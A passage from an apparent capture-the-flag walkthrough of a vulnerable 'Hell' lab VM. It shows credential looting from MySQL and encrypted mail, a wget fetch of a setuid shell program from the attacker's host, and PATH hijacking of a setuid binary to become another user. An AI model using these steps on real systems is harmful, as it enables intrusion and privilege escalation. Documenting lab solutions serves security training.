</span><span class='line'>ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
</span><span class='line'>qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
</span><span class='line'>a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
</span><span class='line'>fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
</span><span class='line'>7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
</span><span class='line'>HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
</span><span class='line'>Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
</span><span class='line'>yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
</span><span class='line'>l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
</span><span class='line'>vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
</span><span class='line'>zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
</span><span class='line'>quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
</span><span class='line'>tqg=
</span><span class='line'>=SCkw
</span><span class='line'>-----END PGP PRIVATE KEY BLOCK-----
</span><span class='line'>$
</span></code></pre></td></tr></table></div></figure>


<p>After poking around, I found <code>.pgp</code> hidden folder which include PGP private key and public key in jack&rsquo;s home directory, take a note and will be used later.</p>

<h2>Moving to <em>milk_4_life</em></h2>

<p>Then I was trying to login to MYSQL database and found jack&rsquo;s web admin password is <em><font color="red">g0tmi1k69</font></em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>$ mysql -uwww-data -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 37
</span><span class='line'>Server version: 5.5.37-0+wheezy1 (Debian)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; show databases;
</span><span class='line'>+--------------------+
</span><span class='line'>| Database           |
</span><span class='line'>+--------------------+
</span><span class='line'>| information_schema |
</span><span class='line'>| website            |
</span><span class='line'>+--------------------+
</span><span class='line'>2 rows in set (0.01 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; use website
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables;
</span><span class='line'>+-------------------+
</span><span class='line'>| Tables_in_website |
</span><span class='line'>+-------------------+
</span><span class='line'>| users             |
</span><span class='line'>+-------------------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt; select * from users;
</span><span class='line'>+----------+-----------+
</span><span class='line'>| username | password  |
</span><span class='line'>+----------+-----------+
</span><span class='line'>| Jack     | g0tmi1k69 |
</span><span class='line'>+----------+-----------+
</span><span class='line'>1 row in set (0.00 sec)
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Then I found there is an email for jack but it is encrypted by PGP, so I need using pgp private key (which is found before) to decrypt the message. Here is a handy <code>gpg</code> help <a href="http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/gpg-cs.html">guide</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -alh /var/mail
</span><span class='line'>total 16K
</span><span class='line'>drwxrwsr-x  4 root   mail   4.0K Jul 15 09:25 .
</span><span class='line'>drwxr-xr-x 12 root   root   4.0K Jun 17  2014 ..
</span><span class='line'>drwxr-sr-x  2 george george 4.0K Jun 20  2014 george
</span><span class='line'>drwxr-sr-x  3 jack   jack   4.0K Jul  5  2014 jack
</span><span class='line'>$ ls -alh /var/mail/jack
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 .
</span><span class='line'>drwxrwsr-x 4 root mail 4.0K Jul 15 09:25 ..
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 received
</span><span class='line'>$ ls -alh /var/mail/jack/received
</span><span class='line'>total 12K
</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 .
</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r--r-- 1 root mail  709 Jun 18  2014 message.eml
</span><span class='line'>$ cat /var/mail/jack/received/message.eml
</span><span class='line'>-----BEGIN PGP MESSAGE-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
</span><span class='line'>=svWU
</span><span class='line'>-----END PGP MESSAGE-----
</span><span class='line'>$ gpg --allow-secret-key-import --import .pgp/pgp.priv
</span><span class='line'>gpg: key 3F18AB0A: secret key imported
</span><span class='line'>gpg: key 3F18AB0A: "jack@cowlovers.com" not changed
</span><span class='line'>gpg: Total number processed: 1
</span><span class='line'>gpg:              unchanged: 1
</span><span class='line'>gpg:       secret keys read: 1
</span><span class='line'>gpg:   secret keys imported: 1
</span><span class='line'>$ gpg /var/mail/jack/received/message.eml
</span><span class='line'>
</span><span class='line'>You need a passphrase to unlock the secret key for
</span><span class='line'>user: "jack@cowlovers.com"
</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>
</span><span class='line'>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>      "jack@cowlovers.com"
</span><span class='line'>gpg: /var/mail/jack/received/message.eml: unknown suffix
</span><span class='line'>Enter new filename [text.txt]: 
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>$ cat text.txt
</span><span class='line'>Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. 
</span><span class='line'>
</span><span class='line'>The password is '4J0WWvL5nS'
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Here we got user <code>milk_4_life</code> has password: <em><font color="red">4J0WWvL5nS</font></em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh milk_4_life@localhost
</span><span class='line'>The authenticity of host 'localhost (::1)' can't be established.
</span><span class='line'>ECDSA key fingerprint is e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
</span><span class='line'>milk_4_life@localhost's password: 
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul 12 07:02:03 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
</span><span class='line'>$ pwd
</span><span class='line'>/home/milk_4_life
</span><span class='line'>$ ls -l
</span><span class='line'>total 12
</span><span class='line'>---s--x--x 1 george      george      5743 Jun 19  2014 game
</span><span class='line'>-rwxr-xr-x 1 milk_4_life milk_4_life  473 Jul 11 20:36 win.py
</span><span class='line'>$ ls -alh
</span><span class='line'>total 36K
</span><span class='line'>drwx------ 2 milk_4_life milk_4_life 4.0K Jul 12 06:59 .
</span><span class='line'>drwxr-xr-x 7 root        root        4.0K Jul  5  2014 ..
</span><span class='line'>-rw------- 1 milk_4_life milk_4_life   51 Jul 12 07:24 .bash_history
</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life 3.4K Jan  1  2013 .bashrc
</span><span class='line'>---s--x--x 1 george      george      5.7K Jun 19  2014 game
</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life  675 Jan  1  2013 .profile</span></code></pre></td></tr></table></div></figure>


<h2>Moving to <em>george</em></h2>

<p>Here we can see that there is program <code>game</code> which is owned by george and sticky bit has been set. That means this program has high possibility to be exploited for privilege escaping to george.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port 
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            *:*     
</span><span class='line'>LISTEN     0      128                                                              *:57356                                                           *:*     
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::*     
</span><span class='line'>LISTEN     0      128                                                              *:111                                                             *:*     
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::*     
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                              *:22                                                              *:*     
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::*     
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              *:*     
</span><span class='line'>LISTEN     0      10                                                               *:666                                                             *:*     
</span><span class='line'>$ ./game &
</span><span class='line'>$ I'm listening
</span><span class='line'>
</span><span class='line'>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port 
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            *:*     
</span><span class='line'>LISTEN     0      128                                                              *:57356                                                           *:*     
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::*     
</span><span class='line'>LISTEN     0      128                                                              *:111                                                             *:*     
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::*     
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::*     
</span><span class='line'>LISTEN     0      128                                                              *:22                                                              *:*     
</span><span class='line'>LISTEN     0      10                                                               *:1337                                                            *:*     
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::*     
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              *:*     
</span><span class='line'>LISTEN     0      10                                                               *:666                                                             *:*     
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>After I run the game program and check listening ports, I found game is listening on port <em>1337</em>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is '^]'.
</span><span class='line'>Type 'START' to begin
</span><span class='line'>
</span><span class='line'>START 
</span><span class='line'>Starting...
</span><span class='line'>
</span><span class='line'>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)
</span><span class='line'>
</span><span class='line'>Quick what's... 769 x 49? 48
</span><span class='line'>Quick what's... 413 x 17? 15
</span><span class='line'>Quick what's... 779 x 106? 45
</span><span class='line'>Quick what's... 439 x 803? 55
</span><span class='line'>Quick what's... 555 x 341? 821
</span><span class='line'>Quick what's... 976 x 1? 
</span><span class='line'>Lol nope
</span><span class='line'>
</span><span class='line'>Final Score: 0
</span><span class='line'>
</span><span class='line'>Connection closed by foreign host.
</span><span class='line'>[1] + Done                       ./game
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>In order to win the game, I wrote a python script to calculate and send the result back to program.</p>

<figure class='code'><figcaption><span>my_win.py  (my_win.py)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/my_win.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START/n&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>  <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s\.\.\. (.*)\?&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;pattern is not found!&quot;</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">res</span>
</span><span class='line'>      <span class="k">break</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">rst</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">rst</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rst</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running the script and win the game, something new appeared <code>I hear the faint sound of chmodding........</code>. That sounds like command <code>chmod</code> has been called after win the game.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/4.png"></p>

<p>Now I decided to check if the command <code>chmod</code> is called from absolute path or not. I upload setuid.c to target server&rsquo;s temporary directory <code>/tmp/</code>, compile it and change the name to <code>chmod</code>.</p>

<figure class='code'><figcaption><span>setuid.c  (setuid.c)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/setuid.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget http://10.10.10.131/setuid.c
</span><span class='line'>--2015-07-16 08:49:24--  http://10.10.10.131/setuid.c
</span><span class='line'>Connecting to 10.10.10.131:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 122 [text/x-csrc]
</span><span class='line'>Saving to: `setuid.c'
</span><span class='line'>
</span><span class='line'>100%[======================================>] 122         --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-07-16 08:49:24 (14.9 MB/s) - `setuid.c' saved [122/122]
</span><span class='line'>
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 milk_4_life milk_4_life 122 Jul 15 22:47 setuid.c
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Next I add <code>/tmp</code> to the beginning of the environmental PATH variable. Then I play the game and run python script to win.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ printenv PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ export PATH=/tmp:$PATH
</span><span class='line'>$ printenv PATH
</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ ./game
</span><span class='line'>I'm listening
</span><span class='line'>$ whoami
</span><span class='line'>george
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Bingo! I am <code>george</code> now. After poking around in the file system, I found <code>container.tc</code> file (which is a Truecrypt encrypted file) in george&rsquo;s home directory. Also george has an email which shows a clue to crack the encrypted file by using rockyou password dictionary.</p>

<h2>Moving to <em>bazza</em></h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd
</span><span class='line'>/home/george
</span><span class='line'>$ ls -l
</span><span class='line'>total 4096
